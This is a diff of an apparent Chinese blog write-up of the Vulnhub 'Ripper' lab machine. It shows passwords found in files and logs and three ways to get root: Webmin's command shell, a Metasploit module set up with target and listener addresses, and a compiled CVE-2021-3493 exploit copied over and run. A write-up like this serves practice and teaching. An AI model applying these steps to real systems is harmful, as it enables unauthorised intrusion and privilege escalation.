+<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下： <pre class="line-numbers language-none"><code class="language-none">This is my secret file
+
+[file system]
+-passwd : Il00tpeople<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>又得到了一个密码，因为属主是cubes，可能这就是cubes用户的ssh登录密码，直接尝试</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155811.png" /></p>
 <p>成功获得cubes权限。</p>
 <h3 id="获得root权限">2.4.2. 获得root权限</h3>
 <h4 id="方法1">2.4.2.1. 方法1</h4>
-<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null|grep -v <span class="string">&quot;proc&quot;</span>|grep -v <span class="string">&quot;.png&quot;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -user cubes -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"proc"</span><span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">".png"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160020.png" /></p>
-<p>经过对文件的查看，发现 miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authentication : session_login.cgi=username=admin&amp;pass=tokiohotel</span><br></pre></td></tr></table></figure></p>
+<p>经过对文件的查看，发现 miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息： <pre class="line-numbers language-none"><code class="language-none">Authentication : session_login.cgi&#x3D;username&#x3D;admin&amp;pass&#x3D;tokiohotel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>这应该就是10000端口的登录界面的账号密码了。成功登录到后台后找到<code>others -&gt; command shell</code>能够直接获得一个shell，惊讶的发现这居然是root权限。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160511.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160527.png" /></p>
-<p>此时可以直接读取flag。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/ripper/flag.txt</span><br><span class="line">__________.____________________________________________ </span><br><span class="line">\______   \   \______   \______   \_   _____/\______   \</span><br><span class="line"> |       _/   ||     ___/|     ___/|    __)_  |       _/</span><br><span class="line"> |    |   \   ||    |    |    |    |        \ |    |   \</span><br><span class="line"> |____|_  /___||____|    |____|   /_______  / |____|_  /</span><br><span class="line">        \/                                \/         \/ </span><br><span class="line"></span><br><span class="line">flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;</span><br><span class="line"></span><br><span class="line">C0ngratulation on getting user ! Lets get root now :)</span><br><span class="line"></span><br><span class="line">// 2. /root/flag.txt</span><br><span class="line">.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. </span><br><span class="line">| |-&#x27;| | | || .` || \ \### | |-&lt; | || |-&#x27;| |-&#x27;| |- | |-&lt; </span><br><span class="line">`-&#x27;  `-----&#x27;`-&#x27;`-&#x27;`-&#x27;-&#x27;    `-&#x27;`-&#x27;`-&#x27;`-&#x27;  `-&#x27;  `---&#x27;`-&#x27;`-&#x27;</span><br><span class="line"></span><br><span class="line">COngrats !!! You have rooted this box !!</span><br><span class="line"></span><br><span class="line">Follow me on twitter @san3ncrypt3d</span><br></pre></td></tr></table></figure></p>
+<p>此时可以直接读取flag。 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1. &#x2F;home&#x2F;ripper&#x2F;flag.txt
+__________.____________________________________________ 
+\______   \   \______   \______   \_   _____&#x2F;\______   \
+ |       _&#x2F;   ||     ___&#x2F;|     ___&#x2F;|    __)_  |       _&#x2F;
+ |    |   \   ||    |    |    |    |        \ |    |   \
+ |____|_  &#x2F;___||____|    |____|   &#x2F;_______  &#x2F; |____|_  &#x2F;
+        \&#x2F;                                \&#x2F;         \&#x2F; 
+
+flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;
+
+C0ngratulation on getting user ! Lets get root now :)
+
+&#x2F;&#x2F; 2. &#x2F;root&#x2F;flag.txt
+.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. 
+| |-&#39;| | | || .&#96; || \ \### | |-&lt; | || |-&#39;| |-&#39;| |- | |-&lt; 
+&#96;-&#39;  &#96;-----&#39;&#96;-&#39;&#96;-&#39;&#96;-&#39;-&#39;    &#96;-&#39;&#96;-&#39;&#96;-&#39;&#96;-&#39;  &#96;-&#39;  &#96;---&#39;&#96;-&#39;&#96;-&#39;
+
+COngrats !!! You have rooted this box !!
+
+Follow me on twitter @san3ncrypt3d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <h4 id="方法2">2.4.2.2. 方法2</h4>
 <p>登录后台之后，可以利用之前提到的远程执行漏洞获得root权限。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161007.png" /></p>
-<p>依次将参数填入： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set rhost 10.0.2.23</span><br><span class="line">set password tokiohotel</span><br><span class="line">set username admin</span><br><span class="line">set SSL true # 切记，10000端口要求ssl</span><br><span class="line">set lhost 10.0.2.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>依次将参数填入： <pre class="line-numbers language-none"><code class="language-none">set rhost 10.0.2.23
+set password tokiohotel
+set username admin
+set SSL true # 切记，10000端口要求ssl
+set lhost 10.0.2.4
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161215.png" /></p>
-<p>得到session后，输入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
+<p>得到session后，输入 <pre class="line-numbers language-none"><code class="language-none">shell
+python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p>得到一个交互式的shell</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161414.png" /></p>
 <h4 id="方法3">2.4.2.3. 方法3</h4>
-<p>通过信息收集，发现靶机的操作系统是Ubuntu <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.5 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure></p>
+<p>通过信息收集，发现靶机的操作系统是Ubuntu <pre class="line-numbers language-none"><code class="language-none">Distributor ID: Ubuntu
+Description:    Ubuntu 18.04.5 LTS
+Release:        18.04
+Codename:       bionic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>而 CVE-2021-3493 是专门针对Ubuntu的一个漏洞。因此可以直接利用。我们先回到ripper用户，由于靶机上没有gcc，因此在kali上编译完成之后发送到靶机执行即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 1. 编译</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line"></span><br><span class="line">// 2. 发送到靶机</span><br><span class="line">scp exp ripper@10.0.2.23:~/ <span class="comment"># 需要输入密码</span></span><br><span class="line"></span><br><span class="line">// 3. 执行</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">1</span>. 编译
+gcc exploit.c -o exp
+
+// <span class="token number">2</span>. 发送到靶机
+<span class="token function">scp</span> exp ripper@10.0.2.23:~/ <span class="token comment"># 需要输入密码</span>
+
+// <span class="token number">3</span>. 执行
+./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162026.png" /></p>
 <h3 id="番外">2.4.3. 番外</h3>
 <p>刚开始的时候并不会使用find命令，而是一个一个文件查看，直到查看了/home/ripper/.bash_history，内容如下（后面的一些命令记录的是我们使用的，但是前面的是作者使用的）</p>
@@ -450,113 +352,164 @@
 <p>该靶机的难度在于能否在到rips的路径，以及信息收集的能力，如果没有使用find命令，那就需要看许多的文件才可以提升权限。</p>
 <p>该靶机的发布时间是早于 CVE-2021-3493 的，因此放法2只能算是取巧了。</p>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
-              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
-              <a href="/tags/rips%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># rips代码审计</a>
-              <a href="/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E5%AF%86/" rel="tag"># 备份文件泄密</a>
-              <a href="/tags/CVE-2021-3493/" rel="tag"># CVE-2021-3493</a>
-              <a href="/tags/Webmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># Webmin漏洞利用</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/" rel="prev" title="Zer0pts2020 Can you guess it">
-                  <i class="fa fa-chevron-left"></i> Zer0pts2020 Can you guess it
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/04/26/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/" rel="next" title="GWCTF 2019 枯燥的抽奖">
-                  GWCTF 2019 枯燥的抽奖 <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97cubes%E6%9D%83%E9%99%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. 获得cubes权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. 获得root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">2.4.2.1. 方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.4.2.2. 方法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">2.4.2.3. 方法3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3. 番外</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&text=15 Vulnhub Ripper Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&is_video=false&description=15 Vulnhub Ripper Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=15 Vulnhub Ripper Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&name=15 Vulnhub Ripper Writeup&description=&lt;p&gt;该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&t=15 Vulnhub Ripper Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
